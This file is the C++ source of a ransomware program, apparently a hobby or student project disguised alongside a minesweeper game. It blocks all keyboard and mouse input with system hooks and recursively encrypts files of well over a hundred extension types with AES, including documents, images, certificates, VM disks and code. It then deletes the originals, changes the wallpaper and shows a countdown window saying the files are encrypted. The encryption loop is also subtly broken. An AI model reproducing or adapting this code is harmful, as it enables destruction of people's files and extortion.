
#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <set>  
#include <SFML/Graphics.hpp>
#include <SFML/Audio.hpp>
#include <SFML/Network.hpp>
#include <SFML/System.hpp>
#include <SFML/Window.hpp>
#include <SFML/Main.hpp>
#include <sstream>
#include <string>
#include <windows.h>

namespace fs = std::filesystem;
HHOOK g_keyboardHook;
HHOOK g_mouseHook;
int run_ransom();
void EncryptFile();
void ListFilesRecursivelyAndEncrypt();

bool hasRunOnce() {
  std::ifstream flagFile("firstrun.flag");
  return flagFile.good();
}

void setHasRunOnceFlag() {
  std::ofstream flagFile("firstrun.flag");
  flagFile.close();
}
void changeDesktopBackground1() {
    // Specify the path to the new background image
    const wchar_t* imagePath = L"C:\\Users\\ASUS\\Downloads\\temp\\ransomware project\\root\\image.png";

    // Set the desktop background
    if (SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)imagePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
        // Wallpaper changed successfully
        printf("Desktop background changed successfully.\n");
    } else {
        // Error occurred
        printf("Error changing desktop background.\n");
    }
}
void SetConsoleTextColor(WORD color) {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, color);
}
// Function to reset console text color to default
void ResetConsoleTextColor() {
	SetConsoleTextColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		// Block all keyboard input by not passing it to the next hook or the default message handler
		return 1;
	}

	// Allow other hooks or default message handling to process the event
	return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		// Block all mouse input by not passing it to the next hook or the default message handler
		return 1;
	}

	// Allow other hooks or default message handling to process the event
	return CallNextHookEx(g_mouseHook, nCode, wParam, lParam);
}

void freeze(){

	// Install the keyboard hook
	g_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);

	// Install the mouse hook
	g_mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, NULL, 0);

}
void free(){
	// Uninstall the keyboard hook when you're done
	UnhookWindowsHookEx(g_keyboardHook);

	// Uninstall the mouse hook when you're done
	UnhookWindowsHookEx(g_mouseHook);

}

int menu();



int main() {

   if (!hasRunOnce()) {
  	freeze();// freeze the screen so the user can't interact with it 
	run_ransom();
	free();// release the screen 
	menu();}
  return 0;
}

void EncryptFile(const fs::path& filePath, const unsigned char* key, const unsigned char* iv) {
	AES_KEY aesKey;
	// Initialize AES encryption
	AES_set_encrypt_key(key, 256, &aesKey);

	// Get the file name and parent directory
	std::string fileName = filePath.filename().string();
	//std::string parentDir = filePath.parent_path().string();
	// Open the input file for reading
	std::ifstream inputFile(filePath, std::ios::binary);
	if (!inputFile.is_open()) {
		std::cerr << "Failed to open file: " << filePath << "\n";
		return;
	}

	// Create the output file with ".mohamed" extension
	std::string encryptedFilePath = filePath.string() + ".mohamed";
	std::ofstream encryptedFile(encryptedFilePath, std::ios::binary);
	if (!encryptedFile.is_open()) {

		SetConsoleTextColor(FOREGROUND_RED | FOREGROUND_INTENSITY); // Red text
		std::cerr << "Already Encrypted  " << encryptedFilePath << "\n";

		ResetConsoleTextColor();
		inputFile.close();
		return;
	}

	// Encrypt the file
	unsigned char inBuffer[AES_BLOCK_SIZE];
	unsigned char outBuffer[AES_BLOCK_SIZE];
	while (!inputFile.eof()) {
		inputFile.read(reinterpret_cast<char*>(inBuffer), AES_BLOCK_SIZE);
		int bytesRead = static_cast<int>(inputFile.gcount());
		AES_encrypt(inBuffer, outBuffer, &aesKey);
		encryptedFile.write(reinterpret_cast<char*>(outBuffer), bytesRead);
	}

	inputFile.close();
	encryptedFile.close();
	SetConsoleTextColor(FOREGROUND_RED | FOREGROUND_INTENSITY); // Red text
	std::cout << "    [Encrypted] " ;
	ResetConsoleTextColor();
	std::cout << fileName << ".mohamed\n";
	// Remove the original file after successful encryption
	if (std::filesystem::remove(filePath)) {
		SetConsoleTextColor(FOREGROUND_RED | FOREGROUND_RED); // Red text
		std::cout << "          [Deleted Original] ";
		ResetConsoleTextColor();
		std::cout  << fileName << "\n";
	} else {

		std::cerr << "    Failed to delete original file: " << filePath << "\n";
	}



}
void ListFilesRecursivelyAndEncrypt(const fs::path& dir, const unsigned char* key, const unsigned char* iv, const std::set<std::string>& allowedExtensions, const std::string& prefix = "") {
	for (const auto& entry : fs::directory_iterator(dir)) {

		if (fs::is_directory(entry)) {
			std::string directoryName = entry.path().filename().string();
			if (directoryName == "fonts"||directoryName == "audio"||directoryName == "assets") {
				SetConsoleTextColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY); // Red text
				std::cout << prefix << "  [Skipped] " ;

				ResetConsoleTextColor();
				std::cout << directoryName << " dir that conatains the source code\n";

			} else {

				SetConsoleTextColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY); // Red text
				std::cout << prefix << "[Directory] ";
				ResetConsoleTextColor();
				std::cout <<directoryName << "\n";

				ListFilesRecursivelyAndEncrypt(entry, key, iv, allowedExtensions, prefix + "  ");
			}
		} else if (fs::is_regular_file(entry)) {
			std::string fileName = entry.path().filename().string();
			std::string fileExtension = entry.path().extension().string();

			// Check if the file should be skipped
			if (fileName == "not_virus.exe" || fileName=="1.ttf" || fileName=="5.png" || fileName=="uncanny.mp3"||fileName == "minesweeper game.exe") {

				SetConsoleTextColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY); // Red text
				std::cout << prefix << "    [Skipped] " << fileName<<"\n";

				ResetConsoleTextColor();
			} else if (allowedExtensions.count(fileExtension) > 0) {
				EncryptFile(entry.path(), key, iv);
			} else {

				SetConsoleTextColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY); // Red text
				std::cout << prefix << "    [Skipped] " ;

				ResetConsoleTextColor();
				std:: cout << fileName ;
				SetConsoleTextColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY); // Red text
				std ::cout << " (Unsupported File Type)\n";
				ResetConsoleTextColor();

			}
		}
	}
}


int run_ransom() { 

	fs::path currentDir = fs::current_path();
	fs::path parentDir = currentDir.parent_path(); // Get the parent directory of the current directory
	std::cout << "Encrypting files in the parent directory of the current directory and its subdirectories:\n";


	// Specify your AES key and IV here
	// Specify your AES key here (32 bytes)
	unsigned char key[32] = {
		0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
		0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
		0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
		0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
	};

	// Specify your AES IV here (16 bytes)
	unsigned char iv[16] = {
		0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
		0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F
	};

	// Specify the allowed file extensions in a set
	std::set<std::string> allowedExtensions = {
		// Text Documents
		".txt", ".doc", ".docx", ".rtf", ".odt", ".tex", ".wps", ".csv",

		// Spreadsheets
		".xls", ".xlsx", ".ods", ".xlr", ".sxc", ".csv",

		// Presentations
		".ppt", ".pptx", ".odp", ".pps", ".key",

		// PDFs and Ebooks
		".pdf", ".epub", ".mobi", ".azw", ".azw3", ".djvu", ".fb2", ".lit",

		// Images
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".ico", ".webp",".jfif", ".jpe", ".jif", ".jfi",

		// Audio
		".mp3", ".wav", ".flac", ".ogg", ".m4a", ".wma", ".aac", ".opus",

		// Videos
		".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".webm", ".3gp", ".m4v", ".vob",

		// Archives and Compressed Files
		".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".z", ".cab", ".iso", ".nrg",

		// Executables and Scripts
		".exe", ".msi", ".bat", ".sh", ".py", ".java", ".cpp", ".html",

		// Database Files
		".sqlite", ".db", ".sql",

		// CAD and 3D Model Files
		".stl", ".obj", ".dae", ".fbx", ".blend",

		// Fonts
		".ttf", ".otf", ".woff",

		// Miscellaneous
		".dat", ".ini", ".cfg", ".log", ".xml", ".json", ".csv", ".bak",

		// Other Document Types
		".odg", ".odf", ".odc", ".odb", ".odm", ".ott", ".ots", ".otp", ".otg",
		".sxw", ".sxi", ".sxd", ".stw", ".sxc", ".sxd", ".std", ".sdd",

		// More uncommon extensions
		".pem", ".cer", ".crt", ".der", ".p12", ".pfx", ".p7b", ".p7c",

		// Virtual Machine Disk Images
		".vmdk", ".vdi", ".vhd",

		// Game-related
		".gmk", ".gm81", ".unity", ".unity3d", ".upk",

		// GIS and Map Files
		".shp", ".kml", ".kmz",

		// Configuration Files
		".conf", ".cfg", ".ini",

		// eBooks and Comics
		".cbr", ".cbz", ".cb7", ".cbt", ".cba", ".cbo", ".cbt",

		// 3D Printing Files
		".gcode", ".amf", ".3mf",

		// More uncommon file types
		".dat", ".c", ".h", ".class", ".jar", ".so", ".ipa", ".apk",

	};

	ListFilesRecursivelyAndEncrypt(currentDir, key, iv, allowedExtensions); // Start encryption from the parent directory
  setHasRunOnceFlag();

	return 0;}

	int  menu(){
		// Create SFML window
		sf::RenderWindow window(sf::VideoMode(600, 600), "Countdown Timer", sf::Style::Default);
		window.setFramerateLimit(60);
		changeDesktopBackground1();

		// Load font
		sf::Font font;
		if (!font.loadFromFile("1.ttf")) {
			std::cerr << "Failed to load font." << std::endl;
			return -1;
		}

		// Create text for countdown
		sf::Text countdownText;
		countdownText.setFont(font);
		countdownText.setCharacterSize(50);
		countdownText.setFillColor(sf::Color::Red);
		// Create the "before the" text
		sf::Text beforeText;
		beforeText.setFont(font);
		beforeText.setCharacterSize(27);
		beforeText.setFillColor(sf::Color::White);
		beforeText.setString("before the");

		// Create the "apocalypse" text
		sf::Text apocalypsText;
		apocalypsText.setFont(font);
		apocalypsText.setCharacterSize(45);
		apocalypsText.setFillColor(sf::Color::Red);
		apocalypsText.setString("apocalypse");

		// Create text for header
		sf::Text headerText;
		headerText.setFont(font);
		headerText.setCharacterSize(60);
		headerText.setFillColor(sf::Color::Yellow);
		headerText.setString("DON'T PANIC!!\n");
		// Create text red
		sf::Text headerText2;
		headerText2.setFont(font);
		headerText2.setCharacterSize(30);
		headerText2.setFillColor(sf::Color::Red);
		headerText2.setString("you are save to close this window and play the game\n");

		// Create text for paragraph (scrollable)
		sf::Text paragraphText;
		paragraphText.setFont(font);
		paragraphText.setCharacterSize(33);
		paragraphText.setFillColor(sf::Color::White);

		// Define the content of the paragraph (replace with your own text)
		std::string str ="\n\n     Your computer's documents are encrypted,\n"
			"     and the only way to decrypt them is to win\n                      in the mineswepper game\n\n                                          Good luck!";
		paragraphText.setString(str);

		// Load background image
		sf::Texture backgroundTexture;
		if (!backgroundTexture.loadFromFile("5.png")) {
			std::cerr << "Failed to load background image." << std::endl;
			return -1;
		}
		sf::Sprite backgroundImage(backgroundTexture);
		backgroundImage.setScale(static_cast<float>(window.getSize().x) / backgroundTexture.getSize().x,
				static_cast<float>(window.getSize().y) / backgroundTexture.getSize().y);

		// Load background music
		sf::Music backgroundMusic;
		if (!backgroundMusic.openFromFile("uncanny.mp3")) {
			std::cerr << "Failed to load background music." << std::endl;

			return -1;
		}
		backgroundMusic.setLoop(true);
		backgroundMusic.play();

		// Countdown timer variables
		sf::Clock clock;
		int days = 5;
		int hours = 0;
		int minutes = 0;
		int seconds = 0;

		while (window.isOpen()) {
			sf::Event event;
			while (window.pollEvent(event)) {
				if (event.type == sf::Event::Closed) {
					window.close();
				}
			}

			// Update countdown timer
			sf::Time elapsed = clock.getElapsedTime();
			if (elapsed.asSeconds() >= 1.0) {
				clock.restart();
				seconds--;
				if (seconds < 0) {
					minutes--;
					seconds = 59;
					if (minutes < 0) {
						hours--;
						minutes = 59;
						if (hours < 0) {
							days--;
							hours = 23;
						}
					}
				}
			}

			// Update countdown text
			std::stringstream countdownString;
			countdownString <<"\n" << days << " days : " << hours << " hours : " << minutes << " min : " << seconds << " sec\n";
			countdownText.setString(countdownString.str());

			// Center-align the countdown text
			sf::FloatRect countdownBounds = countdownText.getLocalBounds();
			countdownText.setOrigin(countdownBounds.left + countdownBounds.width / 2.0f, countdownBounds.top + countdownBounds.height / 2.0f);
			countdownText.setPosition(static_cast<float>(window.getSize().x) / 2.0f, 50.0f);
			// Center the before text
			sf::FloatRect apoBounds2 = beforeText.getLocalBounds();
			beforeText.setOrigin(apoBounds2.left + apoBounds2.width / 2.0f, apoBounds2.top + apoBounds2.height / 2.0f);
			beforeText.setPosition(static_cast<float>(window.getSize().x) / 2.0f, 83.0f);	
			// Center the apocalypse text
			sf::FloatRect apoBounds1 = apocalypsText.getLocalBounds();
			apocalypsText.setOrigin(apoBounds1.left + apoBounds1.width / 2.0f, apoBounds1.top + apoBounds1.height / 2.0f);
			apocalypsText.setPosition(static_cast<float>(window.getSize().x) / 2.0f, 125.0f);
			// Center-align the header text
			sf::FloatRect headerBounds = headerText.getLocalBounds();
			headerText.setOrigin(headerBounds.left + headerBounds.width / 2.0f, headerBounds.top + headerBounds.height / 2.0f);
			headerText.setPosition(static_cast<float>(window.getSize().x) / 2.0f, 250.0f);
			// Center-align the red text
			sf::FloatRect headerBounds2 = headerText2.getLocalBounds();
			headerText2.setOrigin(headerBounds2.left + headerBounds2.width / 2.0f, headerBounds2.top + headerBounds2.height / 2.0f);
			headerText2.setPosition(static_cast<float>(window.getSize().x) / 2.0f, 580.0f);


			// Center-align the paragraph text
			sf::FloatRect paragraphBounds = paragraphText.getLocalBounds();
			paragraphText.setOrigin(paragraphBounds.left + paragraphBounds.width / 2.0f, paragraphBounds.top + paragraphBounds.height / 2.0f);
			paragraphText.setPosition(static_cast<float>(window.getSize().x) / 2.0f, 330.0f);

			// Clear the window
			window.clear();

			// Draw the background image
			window.draw(backgroundImage);

			// Draw the countdown text, header, and paragraph
			window.draw(countdownText);
			window.draw(beforeText);
			window.draw(apocalypsText);
			window.draw(headerText);
			window.draw(paragraphText);
			window.draw(headerText2);

			// Display everything on the screen
			window.display();
		}

		return 0;
	}

